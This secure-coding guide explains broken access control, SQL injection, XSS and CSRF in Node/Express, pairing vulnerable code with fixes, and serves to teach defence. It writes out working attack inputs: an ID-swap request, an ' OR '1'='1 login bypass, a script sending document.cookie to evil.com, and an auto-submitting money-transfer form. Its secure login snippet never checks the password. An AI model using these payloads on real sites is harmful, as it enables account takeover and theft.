# Broken Access Control
What it does?
Allows users to access data or actions they shouldn’t be allowed to.

Impact
Users can read other users’ data
Delete other accounts
Escalate privileges (user → admin)
Massive data breach
Real-World Example
User logs in and sees:
GET /api/orders?userId=123
Attacker changes it manually:
GET /api/orders?userId=456
If backend does not verify ownership → boom.
❌ Vulnerable Code
app.get("/api/orders", async (req, res) => {
  const { userId } = req.query;

  const orders = await db.query(
    "SELECT * FROM orders WHERE user_id = $1",
    [userId]
  );

  res.json(orders.rows);
});
We trust userId from user input.
✅ Secure Version
app.get("/api/orders", async (req, res) => {
  const loggedInUserId = req.user.id; // from session/auth middleware

  const orders = await db.query(
    "SELECT * FROM orders WHERE user_id = $1",
    [loggedInUserId]
  );

  res.json(orders.rows);
});
Prevention Intention
Never trust client-provided identifiers.
Authorization must be enforced server-side based on authenticated identity — not request parameters.

# Injection (SQL Injection)
What it does?
Allows attacker to manipulate database queries.

Impact
Data leak
Delete entire tables
Bypass login
Full DB compromise

Real-World Attack
Login form:
User enters:
email: admin@example.com' OR '1'='1
password: anything

Query becomes:
SELECT * FROM users 
WHERE email = 'admin@example.com' OR '1'='1'
❌ Vulnerable Code
app.post("/login", async (req, res) => {
  const { email, password } = req.body;

  const query = `
    SELECT * FROM users 
    WHERE email = '${email}' AND password = '${password}'
  `;

  const result = await db.query(query);
});
This is deadly.

✅ Secure Version
app.post("/login", async (req, res) => {
  const { email, password } = req.body;

  const result = await db.query(
    "SELECT * FROM users WHERE email = $1",
    [email]
  );
});
Prevention Intention
Never construct queries using string concatenation.
Always separate:
Query structure
User data
Parameterized queries force DB to treat input as data, not code.
Parameterized queries Treats the entire input as one string value "anything' OR '1'='1"

| Database   | Placeholder Style |
| ---------- | ----------------- |
| PostgreSQL | `$1`, `$2`        |
| MySQL      | `?`               |
| SQL Server | `@paramName`      |

# Cross-Site Scripting (XSS)
What it does?
Injects malicious JavaScript into your app.

Impact
Steal session cookies
Modify DOM
Redirect users
Act as victim user
Real-World Example
Comment box:
User submits:
<script>
fetch("https://evil.com/steal?cookie=" + document.cookie)
</script>
If your app stores and renders it → every viewer gets hacked.
❌ Vulnerable Code (Express + EJS)
res.send(`
  <div>
    ${req.body.comment}
  </div>
`);
❌ DOM-Based XSS (Frontend)
const comment = new URLSearchParams(window.location.search).get("comment");
document.getElementById("output").innerHTML = comment;
✅ Secure Version
function escapeHTML(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}
res.send(`
  <div>
    ${escapeHTML(req.body.comment)}
  </div>
`);

Or in React:
<div>{comment}</div> // safe by default
Avoid:
<div dangerouslySetInnerHTML={{ __html: comment }} />
Prevention Intention
Never allow untrusted input to be interpreted as HTML or JavaScript.
Always:
Escape output
Treat user content as text, not markup

# Cross-Site Request Forgery (CSRF)
What it does?
Tricks user into performing unwanted actions while authenticated.

Impact
Delete account
Transfer money
Change email/password

Real-World Attack
Victim logged into bank.
Attacker sends them to:

<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="to" value="attacker">
</form>

<script>
document.forms[0].submit();
</script>
Browser auto-attaches cookies → bank thinks user initiated it.
❌ Vulnerable Backend
app.post("/transfer", (req, res) => {
  // no CSRF check
});

✅ Secure Version (CSRF Token Pattern)
When rendering page:
req.session.csrfToken = crypto.randomUUID();
Embed in form:
<input type="hidden" name="csrfToken" value="serverGeneratedToken">
Validate:
if (req.body.csrfToken !== req.session.csrfToken) {
  return res.status(403).send("Forbidden");
}
Prevention Intention
Ensure every state-changing request includes a secret value attacker cannot guess.
This proves request originated from your site.